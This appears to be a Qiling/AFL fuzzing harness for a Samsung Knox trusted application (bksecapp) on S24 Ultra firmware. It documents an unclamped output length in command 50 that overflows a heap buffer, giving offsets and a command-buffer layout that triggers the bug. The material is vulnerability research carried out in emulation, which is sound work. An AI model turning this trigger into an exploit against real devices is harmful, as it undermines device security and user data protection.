from .params import *
from qiling import Qiling
import struct, os

# === bksecapp cmd50 (BksecappKdf) heap-overflow harness ======================
# Target: Samsung S24 Ultra (SM-S928B, S928BXXS6DZE1) Knox bksecapp QTEE TA.
#         tas/samsung_qsee/SM-S928B_*/bksecapp.mbn  (subject of report S6).
#
# REACHABILITY CAVEAT (RE/triage/bksecapp_lockdown.md): bksecapp is a
# BOOTLOADER-ONLY TA -- 0 HLOS clients, .mbn absent from every Android-mounted
# partition. Any finding here is in the bootloader/fastboot/recovery (or
# pre-SetBlBootComplete TZ-context) threat model, NOT a booted-Android REE->TEE
# escalation. The cmd/rsp buffers are REE shared memory the bootloader supplies.
#
# Staging model (see bksecapp.json): GP lifecycle stubbed (returns TEE_SUCCESS);
# InvokeCommand points DIRECTLY at the REAL dispatcher
#   bksecapp_tz_app_cmd_handler@0x050C
#   ABI: x0 = cmd_buf, w1 = cmd_len, x2 = rsp_buf, w3 = rsp_len
# The dispatcher requires cmd_len==rsp_len==0x1004, mallocs scratch_cmd/
# scratch_rsp = qsee_malloc(0x1004) (the asan-redzoned allocator), memcpy's both
# REE buffers in, gates on GetBlBootComplete()&&!(sec_state&1), then dispatches
# cmd_id = *(u32)scratch_cmd. We drive the dispatcher so the OOB lands in the
# REAL malloc'd scratch_rsp chunk (asan sees the heap redzone). GetBlBootComplete
# returns 0 (the qsee_read_oem_buffer stub zero-fills slot 272 -> strncmp vs
# "boot complete bksecapp" mismatches) so the gate passes to dispatch (the
# realistic boot-window state, before aboot calls cmd 28).
#
# BUG (NEW, confirmed in binary; distinct from S6's fixed-count fuse read):
#   cmd50 BksecappKdf@0x2BA0 (dispatcher routes @0x0864: x0=scratch_cmd+4=REQ,
#   x1=scratch_rsp+4=RESP):
#     0x2d18 ldrb w22,[REQ,#4]! ...      ; ctx_len = REQ+4..6 (24-bit)
#     0x2d4c cmp  w22,#0xff7 ; b.hi      ; ctx_len CLAMPED <= 0xFF7   (OK)
#     0x2cb4..0x2d10 ldrb [REQ,#0..3] ;  ; ECHO REQ[0..3] -> RESP[0..3]
#                    strb [RESP,#0..3]   ;   (so RESP[0..3] := REQ[0..3])
#     0x2db4..0x2dcc ldrb w7,[RESP,#0..3]; out_len = RESP[0..3] = REQ[0..3]
#     0x2db8 add  x6,RESP,#4             ; out_ptr = RESP+4 = scratch_rsp+8
#     0x2dec bl   qsee_kdf(...,x6=out,w7=out_len)   ; NO clamp on out_len
#   => out_len is attacker-controlled from the COMMAND payload's first dword
#   (REQ+0 = cmd_buf+4), echoed through RESP[0..3] and then used raw. The
#   scratch_rsp chunk is malloc(0x1004); writable tail from RESP+4 is
#   0x1004 - 8 = 0xFFC bytes. A real SP800-108 KDF fills the out buffer with
#   EXACTLY out_len bytes -> out_len > 0xFFC overflows the heap chunk. The
#   emulator's qsee_kdf model writes out_len bytes (asan write-checked) ->
#   heap-redzone OOB write -> PC=0xdeadbeef (AFL crash).
#
# Trigger: cmd_buf[0..4]=50 (cmd_id), cmd_buf[4..8]=out_len. AFL drives out_len.

AFL_EXIT = 0x13370          # the emulator's clean fuzz exit
CMD_KDF  = 50               # BksecappKdf

CMD_BASE  = 0x51000000      # cmd_buf  (REE shared memory; must be >= 0x1004)
RSP_BASE  = 0x52000000      # rsp_buf  (REE shared memory; must be >= 0x1004)
REGION    = 0x4000

CMDLEN      = 0x1004        # required by the dispatcher (else 0xD00101FF)
# out_len SOURCE = REQ[0..3] = cmd_buf[4..8] (REQ = scratch_cmd+4 = cmd_buf+4
# after the dispatcher's memcpy). The handler echoes REQ[0..3] -> RESP[0..3]
# then reads out_len from RESP[0..3], so the command payload's first dword is
# the attacker length.
OUT_LEN_OFF = 4             # cmd_buf[4..8] = REQ[0..3] = out_len source
CTX_LEN_OFF = 8             # cmd_buf[8..11] = REQ[4..6] = ctx_len (keep 0)

# Default out_len: just over the 0xFFC writable tail so the OOB write lands on
# the asan redzone immediately. KDF_OUTLEN env forces a fixed value for repro.
DEFAULT_OUTLEN = int(os.environ.get("KDF_OUTLEN", str(0x1100)), 0) & 0xFFFFFFFF


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, name in ((CMD_BASE, "cmd_buf"), (RSP_BASE, "rsp_buf")):
        try:
            ql.mem.map(base, REGION, info=f"[bksecapp_kdf] {name}")
        except Exception as e:
            ql.log.warning(f"[bksecapp_kdf] map {name} @ {hex(base)}: {e}")
    print(f"[bksecapp_kdf] init: cmd@{hex(CMD_BASE)} rsp@{hex(RSP_BASE)}")


def _build_cmd(out_len):
    # cmd_buf: [0..4] = cmd_id (50). REQ = cmd_buf+4.
    #   REQ[0..3]  = cmd_buf[4..8]  = out_len (echoed to RESP, used as KDF size)
    #   REQ[4..6]  = cmd_buf[8..11] = ctx_len -> keep 0 so the handler takes the
    #               fixed-context fallback ("Bksecapp Key Context." len 0x16) and
    #               we don't need a ctx copy (0x2d48 cbz taken -> ctx_len=0x16).
    buf = bytearray(REGION)
    struct.pack_into("<I", buf, 0, CMD_KDF)                 # cmd_id = 50
    struct.pack_into("<I", buf, 4 + 0, out_len & 0xFFFFFFFF)  # REQ[0..3] = out_len
    # cmd_buf[8..11] (REQ[4..6] ctx_len) left 0
    return bytes(buf)


def _build_rsp():
    return bytes(bytearray(REGION))


def place_input_callback(ql: Qiling, input: bytes, _: int):
    # AFL drives out_len across the FULL range so the 0xFFC boundary (the
    # malloc(0x1004) tail minus the 8-byte RESP+4 offset) is discoverable rather
    # than pre-baked: an all-zero seed -> out_len 0 (safe), and AFL finds the
    # > 0xFFC overflow on its own. KDF_OUTLEN env forces a fixed value.
    out_len = DEFAULT_OUTLEN
    if "KDF_OUTLEN" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        # cap defensively to a few MB (the redzone trips at 0xFFC regardless).
        out_len = v % (0x200000 + 1)

    ql.mem.write(CMD_BASE, _build_cmd(out_len))
    ql.mem.write(RSP_BASE, _build_rsp())

    # keep the GP param machinery happy (unused: we override the ABI below)
    setup_params_fuzz(ql, CMD_KDF, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # dispatcher(x0=cmd_buf, w1=cmd_len, x2=rsp_buf, w3=rsp_len); benign return
    # goes to the AFL exit sentinel.
    ql.arch.regs.x0 = CMD_BASE
    ql.arch.regs.x1 = CMDLEN
    ql.arch.regs.x2 = RSP_BASE
    ql.arch.regs.x3 = CMDLEN
    ql.arch.regs.x30 = AFL_EXIT

    print(f"[bksecapp_kdf] cmd=50 BksecappKdf out_len=cmd[4..8]={out_len:#x} "
          f"-> qsee_kdf(out=scratch_rsp+8, {out_len:#x}) heap OOB when > 0xFFC")
    return True
